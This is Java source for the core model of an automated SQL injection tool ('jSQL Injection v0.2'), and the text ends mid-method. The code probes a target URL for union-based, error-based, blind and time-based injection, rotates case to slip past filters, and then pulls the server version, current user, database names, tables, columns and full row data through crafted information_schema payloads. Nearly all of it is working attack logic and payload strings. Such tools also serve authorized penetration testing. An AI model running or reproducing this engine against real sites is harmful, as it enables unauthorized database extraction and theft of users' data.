package mvc.model;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import exception.PreparationException;
import exception.StoppableException;

import mvc.model.blind.BlindInjection;
import mvc.model.blind.TimeInjection;

import mvc.model.database.Column;
import mvc.model.database.Database;
import mvc.model.database.ElementDatabase;
import mvc.model.database.Table;


import tool.StringTool;

/*
 * Model for injection, linked to views by MVC compound pattern
 */
public class InjectionModel extends ModelObservable { 

	public final String jSQLVersion = "v0.2";

	public String 
	insertionCharacter, // i.e, -1 in "[...].php?id=-1 union select[...]"
firstSuccessPageSource,
			initialUrl, // url entered by user
		  visibleIndex, // i.e, 2 in "[...]union select 1,2,[...]", if 2 is matched in HTML source
		  initialQuery, // initialUrl build with index
	
		  	    method, // GET, POST, COOKIE, HEADER (State/Strategy pattern)
	
			   getData,
			  postData,
			cookieData,
			headerData,
	
			 versionDB,
    		 currentDB,
    	   currentUser,
     authenticatedUser,
     
     	   proxyAdress,
     	   	 proxyPort;

	public boolean isProxyfied = false,
					
			  isNormalInjectable = false, // State/Strategy pattern
		   isErrorBasedInjectable = false,
		   isTimeBasedInjectable = false,
		       isBlindInjectable = false,

		  useErrorBasedInjection = false,
			      useBlindInjection = false,
					      useTimeBasedInjection = false;

	public boolean isInjectionBuilt = false;
	
	private BlindInjection blindModel;
	private TimeInjection timeModel;
	
	public InjectionModel(){
		this.sendMessage("-- jSQL Injection "+ jSQLVersion +" --");
	}
	
	public int etape = 0;

	public void inputValidation(){
			insertionCharacter = 
				  visibleIndex =
				  initialQuery =
				  
					 versionDB =
		    		 currentDB =
		    	   currentUser =
		     authenticatedUser = null;
						
					  stopFlag =
			
			isNormalInjectable = 
		isErrorBasedInjectable = 
			 isBlindInjectable = 
	     isTimeBasedInjectable = 

	     	  isInjectionBuilt =
			       
 	  	useErrorBasedInjection = 
 	  	 useTimeBasedInjection = 
 	  	 	 useBlindInjection = false;
		
					blindModel = null;
					 timeModel = null;
		
		try{
			if(isProxyfied && !proxyAdress.equals("") && !proxyPort.equals("")){
				try {
				  	new Socket(proxyAdress, Integer.parseInt(proxyPort)).close();
				} catch (Exception e) {
					throw new PreparationException("Proxy connection failed: " + proxyAdress+":"+proxyPort);
				}
				
				System.setProperty("http.proxyHost", proxyAdress);
				System.setProperty("http.proxyPort", proxyPort);
			}
	
			try {
				this.sendMessage("*** Starting new injection\nConnection test...");
				
				URLConnection con = new URL(this.initialUrl).openConnection();
				con.setReadTimeout(15000);
				con.setConnectTimeout(15000);

				BufferedReader reader = new BufferedReader(new InputStreamReader( con.getInputStream() ));
				reader.readLine();
				reader.close();
			} catch (IOException e) {
				throw new PreparationException("Connection problem: " + e.getMessage());
			}
			
			// Design Pattern: State
			this.sendMessage("Get insertion character...");
			this.insertionCharacter = new Stoppable_getInsertionCharacter(this).begin();
			
			this.sendMessage("Time based test...");
			this.isTimeBasedInjectable = this.isTimeBasedInjectable();
			if(this.isTimeBasedInjectable)
				new GUIThread("add-timebased").run();
			
			this.sendMessage("Blind test...");
			this.isBlindInjectable = this.isBlindInjectable();
			if(this.isBlindInjectable)
				new GUIThread("add-blind").run();
			
			this.sendMessage("Error based test...");
			this.isErrorBasedInjectable = this.isErrorBasedInjectable();
			if(this.isErrorBasedInjectable)
				new GUIThread("add-errorbased").run();
	
			this.sendMessage("Normal test...");
			this.initialQuery = new Stoppable_getInitialQuery(this).begin();
			this.isNormalInjectable = !this.initialQuery.equals("");
			
			// State
			if( !this.isNormalInjectable ){
				if(this.isErrorBasedInjectable/* && etape==2*/){
					this.sendMessage("Using error based injection...");
					this.useErrorBasedInjection = true;
				}else if(this.isBlindInjectable/* && etape==2*/){
					this.sendMessage("Using blind injection...");
					this.useBlindInjection = true;
					new GUIThread("binary-message","Each request will ask \"Is the bit is true?\", and a true response must not contains the following false opcode: "+blindModel.constantFalseMark+"\n").run();
				}else if(this.isTimeBasedInjectable/* && etape==2*/){
					this.sendMessage("Using timebased injection...");
					this.useTimeBasedInjection = true;
					new GUIThread("binary-message","Each request will ask \"Is the bit is true?\", and a true response must not exceed 5 seconds.\n").run();
				}else{
					etape++;
					if(etape<=2){
						this.sendMessage("Injection not possible, testing evasion n�"+etape+"...");
						getData += insertionCharacter; // sinon perte de insertionCharacter entre 2 injections
						inputValidation();
						return;
					}else
						throw new PreparationException("Injection not possible, work stopped");		
				}
			}else{
				this.sendMessage("Using normal injection...");
				new GUIThread("add-normal").run();
				try{
					this.visibleIndex = this.getVisibleIndex(this.firstSuccessPageSource);
				}catch(ArrayIndexOutOfBoundsException e){
					etape++;
					if(etape<=2){
						this.sendMessage("Injection not possible, testing evasion n�"+etape+"...");
						getData += insertionCharacter; // sinon perte de insertionCharacter entre 2 injections
						inputValidation();
						return;
					}else
						throw new PreparationException("Injection not possible, work stopped");		
				}
			}
			
			this.sendMessage("Fetching informations...");
			this.getDBInfos();
			
			if(versionDB.startsWith("4")||versionDB.startsWith("3"))
				throw new PreparationException("Old database, automatic search is not possible");	 
			
			this.sendMessage("Fetching databases...");
			this.listDatabases();
			this.sendMessage("Done.");
			
			isInjectionBuilt = true;
		}catch(PreparationException e){
			sendErrorMessage(e.getMessage());
		}catch(StoppableException e){
			sendErrorMessage(e.getMessage());
		}finally{
			new GUIThread("end-preparation").run();
		}
	}
	
	private class Stoppable_getInsertionCharacter extends Stoppable{
		public Stoppable_getInsertionCharacter(InjectionModel model) {
			super(model);
		}

		@Override
		public String action(Object... args) throws PreparationException, StoppableException {
			if( model.method.equals("GET") && (model.getData == null || model.getData.equals("")) ){
				throw new PreparationException("No query string");
			}else if( model.method.equals("GET") && model.getData.matches("[^\\w]*=.*") ){
				throw new PreparationException("Bad query string for injection");
			}else if( model.method.equals("GET") && !model.getData.matches(".*=$") ){ 
		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.getData);
				regexSearch.find();
				try{
					model.getData = regexSearch.group(1);
					return regexSearch.group(2);
				}catch(IllegalStateException e){
					throw new PreparationException("Incorrect GET format");
				}
		    }else if( model.method.equals("POST") && !model.postData.matches(".*=$") ){ 
		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.postData);
				regexSearch.find();
				try{
					model.postData = regexSearch.group(1);
					return regexSearch.group(2);
				}catch(IllegalStateException e){
					throw new PreparationException("incorrect POST format");
				}
		    }else if( model.method.equals("COOKIE") && !model.cookieData.matches(".*=$") ){ 
		    	Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.cookieData);
				regexSearch.find();
				try{
					model.cookieData = regexSearch.group(1);
					return regexSearch.group(2);
				}catch(IllegalStateException e){
					throw new PreparationException("incorrect Cookie format");
				}
		    }else if( model.method.equals("HEADER") && !model.headerData.matches(".*:$") ){ 
		    	Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(model.headerData);
				regexSearch.find();
				try{
					model.headerData = regexSearch.group(1);
					return regexSearch.group(2);
				}catch(IllegalStateException e){
					throw new PreparationException("incorrect Header format");
				}
		    }
			
			ExecutorService taskExecutor = Executors.newCachedThreadPool();
	        CompletionService<MyCallable> taskCompletionService = new ExecutorCompletionService<MyCallable>(taskExecutor);
	        for( String insertionCharacter : new String[] {"0","0'","'","-1","1","\"","-1)"} )
	        	taskCompletionService.submit(new MyCallable(insertionCharacter + "+order+by+1337--+",insertionCharacter));
	        
	        int total=7;
	        while(0<total){
//	        	try { System.out.println("Stoppable_getInsertionCharacter"); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
	        	if(isPreparationStopped()) throw new StoppableException();
	        	try {
					MyCallable currentCallable = taskCompletionService.take().get();
					total--;
					String pageSource = currentCallable.content;
					if(Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
						Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()){
						return currentCallable.tag;
					}
				} catch (InterruptedException e) {
					e.printStackTrace();
				} catch (ExecutionException e) {
					e.printStackTrace();
				}
	        }
	        
			return "1";
		}
	}

	private class Stoppable_getInitialQuery extends Stoppable{
		public Stoppable_getInitialQuery(InjectionModel model) {
			super(model);
		}
		
		@Override
		public String action(Object... args) throws PreparationException, StoppableException {
			ExecutorService taskExecutor = Executors.newCachedThreadPool();
	        CompletionService<MyCallable> taskCompletionService = new ExecutorCompletionService<MyCallable>(taskExecutor);

	        boolean trouve = false;
	        String selectFields, initialQuery="";
			int selectIndex;
	        for(selectIndex=1, selectFields="133717330%2b1"; selectIndex<=10 ;selectIndex++, selectFields += ",1337"+selectIndex+"7330%2b1")
	        	taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
	        	
	        int total=10;
	        
			try {
				while( !trouve && total<99 ){
//					try { System.out.println("Stoppable_getInitialQuery " + selectIndex); Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
					if(isPreparationStopped()) throw new StoppableException();
	
					MyCallable currentCallable = taskCompletionService.take().get();
//		        	System.out.println(new Date() + " - " + currentCallable.url);
		        	if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
		        		model.firstSuccessPageSource = currentCallable.content;
		        		initialQuery = currentCallable.url.replaceAll("0%2b1","1");
//		        		System.out.println("r�sultat: "+initialQuery);
		        		trouve = true;
	//		        		break;
		        	}else{
		        		selectIndex++;
		        		selectFields += ",1337"+selectIndex+"7330%2b1";
		    	        taskCompletionService.submit(new MyCallable(insertionCharacter + "+union+select+" + selectFields + "--+"));
		        		total++;
		        	}
				}
		        taskExecutor.shutdown();
				taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ExecutionException e) {
				e.printStackTrace();
			}

	        if(trouve)
	        	return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$","+");
			return "";
		}
	}

	private String getVisibleIndex(String firstSuccessPageSource) {		
		Matcher regexSearch = Pattern.compile("1337(\\d+?)7331", Pattern.DOTALL).matcher(firstSuccessPageSource);
		ArrayList<String> foundIndexes = new ArrayList<String>(); 
		while(regexSearch.find()) 
			foundIndexes.add( regexSearch.group(1) ); 
		
		String[] indexes = foundIndexes.toArray(new String[foundIndexes.size()]);
		
		this.initialQuery = this.initialQuery.replaceAll("1337(?!"+ StringTool.join(indexes,"|") +"7331)\\d*7331","1");
		if(indexes.length == 1) 
			return indexes[0];
		
		String performanceQuery = 
				this.initialQuery.replaceAll(
					"1337("+ StringTool.join(indexes,"|") +")7331",
					"(select+concat(0x53514c69,$1,repeat(0xb8,1024),0x694c5153))"
				);
		
		String performanceSourcePage = this.inject(performanceQuery);
		regexSearch = Pattern.compile("SQLi(\\d+)(#*)", Pattern.DOTALL).matcher(performanceSourcePage);
		ArrayList<String[]> performanceResults = new ArrayList<String[]>();
		while(regexSearch.find()) 
			performanceResults.add( new String[]{regexSearch.group(1),regexSearch.group(2)} ); 
		
		Integer[][] lengthFields = new Integer[performanceResults.size()][2];
		for(int i=0; i < performanceResults.size() ;i++) //# V�rifie quel est l'index qui renvoie le plus de donn�es
			lengthFields[i] = 
					new Integer[]{ 
						performanceResults.get(i)[1].length(), 
						Integer.parseInt(performanceResults.get(i)[0]) 
					};
		
		Arrays.sort(lengthFields, new Comparator<Integer[]>() {
		    @Override
		    public int compare(Integer[] s1, Integer[] s2) {
		        Integer t1 = s1[0];
		        Integer t2 = s2[1];
		        return t1.compareTo(t2);
		    }
		});
	
		this.initialQuery = 
				this.initialQuery.replaceAll(
					"1337(?!"+ lengthFields[lengthFields.length-1][1] +"7331)\\d*7331",
					"1"
				);
		return Integer.toString(lengthFields[lengthFields.length-1][1]);
	}

	private boolean isErrorBasedInjectable() {		
		String performanceSourcePage = this.inject(
			this.insertionCharacter + 
			"+and(" +
				"select+1+" +
				"from(" +
					"select+" +
						"count(*)," +
						"floor(rand(0)*2)" +
					"from+" +
						"information_schema.tables+" +
					"group+by+2" +
				")a" +
			")--+"
		);
		
		return 	performanceSourcePage.indexOf("Duplicate entry '1' for key ") != -1 ||
				performanceSourcePage.indexOf("Like verdier '1' for ") != -1 ||
				performanceSourcePage.indexOf("Like verdiar '1' for ") != -1 ||
				performanceSourcePage.indexOf("Kattuv v��rtus '1' v�tmele ") != -1 ||
				performanceSourcePage.indexOf("Opakovan� k��� '1' (��slo k���a ") != -1 ||
				performanceSourcePage.indexOf("pienie '1' dla klucza ") != -1 ||
				performanceSourcePage.indexOf("Duplikalt bejegyzes '1' a ") != -1 ||
				performanceSourcePage.indexOf("Ens v�rdier '1' for indeks ") != -1 ||
				performanceSourcePage.indexOf("Dubbel nyckel '1' f�r nyckel ") != -1 ||
				performanceSourcePage.indexOf("kl�� '1' (��slo kl��e ") != -1 ||
				performanceSourcePage.indexOf("Duplicata du champ '1' pour la clef ") != -1 ||
				performanceSourcePage.indexOf("Entrada duplicada '1' para la clave ") != -1 ||
				performanceSourcePage.indexOf("Cimpul '1' e duplicat pentru cheia ") != -1 ||
				performanceSourcePage.indexOf("Dubbele ingang '1' voor zoeksleutel ") != -1 ||
				performanceSourcePage.indexOf("Valore duplicato '1' per la chiave ") != -1 ||
				/*jp*/
				performanceSourcePage.indexOf("Dupliran unos '1' za klju") != -1 ||
				performanceSourcePage.indexOf("Entrada '1' duplicada para a chave ") != -1
				/*kr grk ukr rss*/
				;
	}

	private boolean isBlindInjectable() throws PreparationException {
		blindModel = new BlindInjection(this, this.initialUrl+this.getData+this.insertionCharacter); // forme une url GET, mais devrait �tre g�n�rique (post/cookie/header)
		return blindModel.isBlindInjectable();
	}

	private boolean isTimeBasedInjectable() throws PreparationException {
		timeModel = new TimeInjection(this, this.initialUrl+this.getData+this.insertionCharacter);
		return timeModel.isTimeInjectable();
	}

	private void getDBInfos() throws PreparationException, StoppableException {		
		String[] sourcePage = {""};
		
		String hexResult = new Stoppable_loopIntoResults(this).action(
				"concat(" +
					"hex(" +
					"concat_ws(" +
						"0x7b257d," +
						"version()," +
						"database()," +
						"user()," +
						"CURRENT_USER" +
					")" +
				")" +
				"," +
				"0x69" +
			")", 
			sourcePage, 
			false, 
			0, 
			null);
		
		if(hexResult.equals("")){
			this.sendResponseFromSite( "Show db info failed", sourcePage[0].trim() );
			throw new PreparationException();
		}
		
        this.versionDB = StringTool.hexstr(hexResult).split("\\{%\\}")[0];
        this.currentDB = StringTool.hexstr(hexResult).split("\\{%\\}")[1];
        this.currentUser = StringTool.hexstr(hexResult).split("\\{%\\}")[2];
        this.authenticatedUser = StringTool.hexstr(hexResult).split("\\{%\\}")[3];
        
	    new GUIThread("add-info").run();	        
	}

	private void listDatabases() throws PreparationException, StoppableException {		
		String[] sourcePage = {""};
		String hexResult = new Stoppable_loopIntoResults(this).action(
			"select+" +
				"concat(" +
					"group_concat(" +
						"0x6868," +
						"r," +
						"0x6a6a," +
						"hex(cast(q+as+char))," +
						"0x6868" +
						"+order+by+r+" +
						"separator+0x6767" +
					")," +
					"0x69" +
				")" +
			"from(" +
				"select+" +
					"hex(cast(TABLE_SCHEMA+as+char))r," +
					"count(TABLE_NAME)q+" +
				"from+" +
					"INFORMATION_SCHEMA.tables+" +
				"group+by+r{limit}" +
			")x", 
			sourcePage, 
			true, 
			0, 
			null
		);
		
		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching databases fails", sourcePage[0].trim() );
			throw new PreparationException();
		}
		
		regexSearch.reset();
		
		List<Database> databases = new ArrayList<Database>();
		while(regexSearch.find()){ 
		    String databaseName = StringTool.hexstr(regexSearch.group(1));
			String tableCount = StringTool.hexstr(regexSearch.group(2));
			
			Database newDatabase = new Database(databaseName,tableCount+"");
			databases.add(newDatabase);
		}
		
	    new GUIThread("add-databases", databases).run();	 
	}

	public void listTables(Database database, Interruptable interruptable) throws NumberFormatException, PreparationException, StoppableException {
	    new GUIThread("start-progress", database).run();

		String tableCount = database.tableCount;
				
		String[] pageSource = {""};
		String hexResult = new Stoppable_loopIntoResults(this, interruptable).action(
			"select+" +
				"concat(" +
					"group_concat(" +
						"0x6868," +
						"hex(cast(r+as+char))," +
						"0x6a6a," +
						"hex(cast(ifnull(q,0x30)+as+char))," +
						"0x6868+" +
						"order+by+r+" +
						"separator+0x6767" +
					")," +
					"0x69" +
				")" +
			"from(" +
				"select+" +
					"TABLE_NAME+r," +
					"table_rows+q+" +
				"from+" +
					"information_schema.tables+" +
				"where+" +
					"TABLE_SCHEMA=0x" + StringTool.strhex(database+"")  + "+" +
					"order+by+r{limit}" +
			")x"
			, 
			pageSource, 
			true, 
			Integer.parseInt(tableCount), 
			database
		);
	    
		Matcher regexSearch = 
				Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching tables fails", pageSource[0].trim() );
		}else{
			regexSearch.reset();
			
			List<Table> tables = new ArrayList<Table>();
			while(regexSearch.find()){ 
				String tableName = StringTool.hexstr(regexSearch.group(1));
				String rowCount  = StringTool.hexstr(regexSearch.group(2));
				
				Table newTable = new Table(tableName, rowCount, database);
				tables.add(newTable);
			}
			
		    new GUIThread("add-tables", tables).run();	        
		}
		
	    new GUIThread("end-progress", database).run();		
	}
	
	public void listColumns(Table table, Interruptable interruptable) throws PreparationException, StoppableException {
	    new GUIThread("start-indeterminate-progress", table).run();
	    
		String[] pageSource = {""};
		String hexResult = new Stoppable_loopIntoResults(this, interruptable).action(
			"select+" +
				"concat(" +
					"group_concat(" +
						"0x6868," +
						"hex(cast(n+as+char))," +
						"0x6a6a," +
						"0x3331," +
						"0x6868+" +
						"order+by+n+" +
						"separator+0x6767" +
					")," +
					"0x69" +
				")" +
			"from(" +
				"select+" +
					"COLUMN_NAME+n+" +
				"from+" +
					"information_schema.columns+" +
				"where+" +
					"TABLE_SCHEMA=0x"+StringTool.strhex(table.parentDatabase+"")+"+" +
				"and+" +
					"TABLE_NAME=0x"+StringTool.strhex(table+"")+"+" +
				"order+by+n{limit}" +
			")x", 
			pageSource, 
			true, 
			0, 
			table
		);
	
		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching columns fails", pageSource[0].trim() );
		}else{
			regexSearch.reset();
			
			List<Column> columns = new ArrayList<Column>();
			while(regexSearch.find()){ 
				String columnName = StringTool.hexstr(regexSearch.group(1));
				
				Column newColumn = new Column(columnName, table);
				columns.add(newColumn);
			}
			
			new GUIThread("add-columns", columns).run();
		}
		
	    new GUIThread("end-indeterminate-progress", table).run();
	}

	public void listValues(List<Column> argsElementDatabase, Interruptable interruptable) throws PreparationException, StoppableException {
		ElementDatabase database = argsElementDatabase.get(0).getParent().getParent();
		ElementDatabase table = argsElementDatabase.get(0).getParent();
		int rowCount = argsElementDatabase.get(0).getParent().getCount();
		
	    new GUIThread("start-progress", table).run();
	    
		List<String> columnsName = new ArrayList<String>();
		for(ElementDatabase e: argsElementDatabase)
			columnsName.add(e+"");
		
		String[] arrayColumns = columnsName.toArray(new String[columnsName.size()]);
		String formatListColumn = StringTool.join(arrayColumns, "{%}");
//		formatListColumn = formatListColumn.replace("{%}", "`),0x7f,trim(`" ); // 7f caract�re d'effacement, dernier code hexa support� par mysql, donne 3f=>? � partir de 80
		formatListColumn = formatListColumn.replace("{%}", "`,0x00)),0x7f,trim(ifnull(`" ); // 7f caract�re d'effacement, dernier code hexa support� par mysql, donne 3f=>? � partir de 80
//		formatListColumn = "trim(`" + formatListColumn + "`)" ;
		formatListColumn = "trim(ifnull(`" + formatListColumn + "`,0x00))" ;
		
		String[] pageSource = {""};
		String hexResult = new Stoppable_loopIntoResults(this, interruptable).action(
				"select+concat(" +
					"group_concat(" +
						"0x6868," +
						"r," +
						"0x6a6a," +
						"hex(cast(q+as+char))," +
						"0x6868" +
						"+order+by+r+separator+0x6767" +
					")," +
					"0x69" +
				")from(" +
					"select+" +
						"hex(cast(concat("+ formatListColumn +")as+char))r," +
						"count(*)q+" +
					"from+" +
						"`"+ database +"`.`"+ table +"`+" +
					"group+by+r{limit}" +
				")x"  
				, pageSource, true, rowCount, table
		);

		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
		
		if(!regexSearch.find()){
			this.sendResponseFromSite( "Fetching values fails (row count may be approximate)", pageSource[0].trim() );
		}
		
		int rowsFound = 0, duplicates = 0, cutted = 0;
		List<List<String>> listValues = new ArrayList<List<String>>();
			
		regexSearch.reset();
		while(regexSearch.find()){ 
			String values = StringTool.hexstr(regexSearch.group(1));
			int instances = Integer.parseInt( StringTool.hexstr(regexSearch.group(2)) );
			if(regexSearch.group(3) != null)
				cutted++;
			
			listValues.add(new ArrayList<String>());
			listValues.get(rowsFound).add(""+(rowsFound+1));
			listValues.get(rowsFound).add(""+instances);
			for(String cellValue: values.split(StringTool.hexstr("7f"),-1)){
				listValues.get(rowsFound).add(cellValue);
			}
            duplicates += instances - 1;
            rowsFound++;
//            System.out.println( rowsFound + ". "+ instances +"x "+  values.replace("00", "").replace("\r\n", "").replace("\n", "").replace("\r", "") );
		}
		
//    	System.out.println( "# Results: "+ duplicates +" duplicates, "+ rowsFound +" distinct values, " /*+ (rowCount-rowsFound-duplicates) +" unreachables duplicates, "*/ + cutted + " rows truncated\n");

        columnsName.add(0,"nbRow");
        columnsName.add(0,"#");
        
        String[][] tableDatas = new String[listValues.size()][columnsName.size()] ;
        for(int indexRow=0; indexRow<listValues.size() ;indexRow++){
        	boolean isIncomplete = false;
        	for(int indexColumn=0; indexColumn<columnsName.size() ;indexColumn++){
        		try{
        			tableDatas[indexRow][indexColumn] = listValues.get(indexRow).get(indexColumn);
        		}catch(IndexOutOfBoundsException e){
        			isIncomplete = true;
        		}
        	}
        	if(isIncomplete){
        		this.sendErrorMessage("Max string length reached on the distant MySQL server, the row number "+(indexRow+1)+" is incomplete:\n" + 
        				StringTool.join(listValues.get(indexRow).toArray(new String[listValues.get(indexRow).size()]), ", ") );
        	}
        }

		arrayColumns = columnsName.toArray(new String[columnsName.size()]);
		Object[] objectData = {arrayColumns, tableDatas, table};
		
	    new GUIThread("add-values", objectData).run();
	    new GUIThread("end-progress", table).run();
	}

	private class Stoppable_loopIntoResults extends Stoppable{
		public Stoppable_loopIntoResults(InjectionModel model) {
			super(model);
		}
		public Stoppable_loopIntoResults(InjectionModel model, Interruptable interruptable){
			super(model, interruptable);
		}

		@Override
		public String action(Object... args) throws PreparationException, StoppableException {
			String initialSQLQuery = (String) args[0]; 
			String[] sourcePage = (String[]) args[1];
			boolean useLimit = (Boolean) args[2];
			int numberToFind = (Integer) args[3];
			ElementDatabase searchName = (ElementDatabase) args[4];

			String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}","");
			
			String finalResultSource = "", currentResultSource = "";
			for(int limitSQLResult=0, startPosition=1, i=1;/* 3 */;startPosition = currentResultSource.length()+1, i++){
				
//				try { /*System.out.println("loop: "+currentResultSource);*/ Thread.sleep(500); } catch (InterruptedException e) { e.printStackTrace(); }
//				if(isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())) throw new StoppableException();
				if(isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())) break;
					
				if(model.useTimeBasedInjection){
					sourcePage[0] = timeModel.inject("(" +
							"select+" +
							"concat(" +
								"0x53514c69," +
								"mid(" +
									"("+sqlQuery+")," +
									startPosition+"," +
									"65536" +
								")" +
							")"+
						")", interruptable, this);
				}else if(model.useBlindInjection){
					sourcePage[0] = blindModel.inject("(" +
							"select+" +
							"concat(" +
								"0x53514c69," +
								"mid(" +
									"("+sqlQuery+")," +
									startPosition+"," +
									"65536" +
								")" +
							")"+
						")", interruptable, this);
				}else if(model.useErrorBasedInjection){
					sourcePage[0] = model.inject( 
							model.insertionCharacter + "+and" +
								"(" +
									"select+" +
										"1+" +
									"from(" +
										"select+" +
											"count(*)," +
											"concat(" +
												"0x53514c69," +
												"mid(" +
													"("+ sqlQuery +")," +
													startPosition + "," +
													"64" +
												")," +
												"floor(rand(0)*2)" +
											")" +
										"from+information_schema.tables+" +
										"group+by+2" +
									")a" +
								")--+" );				
				}else{
					sourcePage[0] = model.inject( 
						"select+" +
							"concat(" +
								"0x53514c69," +
								"mid(" +
									"("+sqlQuery+")," +
									startPosition+"," +
									"65536" +
								")" +
							")",
						null,
						true
					);
				}
				
//				model.sendMessage("Packet "+i+".\n"+currentResultSource);
	
				Matcher regexSearch = Pattern.compile("SQLi([0-9A-Fghij]+)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(sourcePage[0]);
				
				if(!regexSearch.find()){
					if( useLimit && !finalResultSource.equals("") ){
//						model.sendMessage("A");
						if(numberToFind>0 && searchName != null) // n�cessaire
							new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).run();
						break;
					}
				}
				
				try{
					currentResultSource += regexSearch.group(1);
					new GUIThread("logs-message",regexSearch.group(1)+" ").run();
				}catch(IllegalStateException e){
					if(searchName != null){ // si diff�rent d'une recherche de database
						new GUIThread("end-progress", searchName).run();
					}
					throw new PreparationException("Fetching fails: no data to parse for "+searchName);
				}
				
				regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
				int nbResult=0;
				while(regexSearch.find()){
					nbResult++;
				}
				
				if( useLimit ){
					if(numberToFind>0 && searchName != null)
						new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult + nbResult}).run();
	
//					System.out.println("Request " + i + ", data collected "+(limitSQLResult + nbResult) + (numberToFind>0?"/"+numberToFind:"") + " << " + currentResultSource.length() + " bytes" );
				}
	
				/* Design Pattern: State */
				if(currentResultSource.contains("i")){
					finalResultSource += currentResultSource = Pattern.compile("i.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
					if( useLimit ){
						finalResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
						currentResultSource = Pattern.compile("(gh+|j+\\d*)$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource).replaceAll("");
						
						regexSearch = Pattern.compile("[0-9A-F]hhgghh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
						Matcher regexSearch2=Pattern.compile("h[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(currentResultSource);
						
						if(regexSearch.find()){
							finalResultSource = Pattern.compile("hh[0-9A-F]+$", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource).replaceAll("");
						}else if(regexSearch2.find()){
							finalResultSource += "jj31chh";
						}
						
						regexSearch = Pattern.compile("(h[0-9A-F]*jj[0-9A-F]*c?h)", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(finalResultSource);
						
						nbResult=0;
						while(regexSearch.find()){
							nbResult++;
						}
						limitSQLResult = nbResult;
						
//						System.out.println("Request " + i + ", data collected " + limitSQLResult + (numberToFind>0 ? "/"+numberToFind : "" ));
						if(numberToFind>0 && searchName != null)
							new GUIThread("update-progressbar", new Object[]{searchName,limitSQLResult}).run();
	
						if( limitSQLResult == numberToFind ){ 
//							model.sendMessage("B");
							if(numberToFind>0 && searchName != null)
								new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).run();
							break; 
						}
						
	                    sqlQuery = Pattern.compile("\\{limit\\}", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(initialSQLQuery).replaceAll("+limit+" + limitSQLResult + ",65536");
	                    startPosition=1;
	                    currentResultSource="";
					}else {
//						model.sendMessage("C");
						if(numberToFind>0 && searchName != null)
							new GUIThread("update-progressbar", new Object[]{searchName,numberToFind}).run();
						break;
					}
				}else if(currentResultSource.length() % 2 == 0){
					currentResultSource = currentResultSource.substring(0, currentResultSource.length()-1);
				}
				
			}

			return finalResultSource;
		}
	}

	public String inject( String dataInjection ){
		return this.inject(dataInjection, null, false);
	}

	public String inject( String dataInjection, String[] responseHeader, boolean useVisibleIndex ){
	    HttpURLConnection connection = null;
		URL urlObject = null;

		String urlUltimate = this.initialUrl;
		dataInjection = dataInjection.replace("\\", "\\\\"); // escape crazy characters, like \ 
		
		try {
			urlObject = new URL(urlUltimate);
		} catch (MalformedURLException e) {
			this.sendErrorMessage(e.getMessage());
		}
		
		if(this.getData != null && !this.getData.equals("")){
			urlUltimate += this.buildQuery("GET", getData, useVisibleIndex, dataInjection);
			try {
				switch(etape){
				case 1: urlUltimate = urlUltimate
						.replaceAll("union\\+", "uNiOn+")
						.replaceAll("select\\+", "sElEcT+")
